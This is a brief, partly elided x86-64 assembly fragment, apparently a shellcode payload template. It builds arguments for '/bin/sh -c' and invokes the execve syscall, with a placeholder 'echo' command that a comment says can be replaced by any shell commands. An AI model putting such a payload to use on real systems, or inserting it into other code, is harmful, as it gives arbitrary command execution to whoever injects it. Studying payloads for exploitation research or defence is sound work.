...
argv0:  .asciz "/bin/sh"
    .equ argv1_offset, . - argv0
argv1:  .asciz "-c"
    .equ argv2_offset, . - argv0
argv2:  .asciz "echo hello from the payload"        # replace this line with whatever shell command(s).
...
get_rel_argv_offset:
    ...
    lea rcx, [rdi + argv2_offset]                   # this is shorter than using rip-relative addressing
    push rcx                                        # argv[2]
    lea rcx, [rdi + argv1_offset]
    push rcx                                        # argv[1]
    push rdi                                        # argv[0]
    mov rsi, rsp                                    # argv[]
    push 59                                         # sys_execve
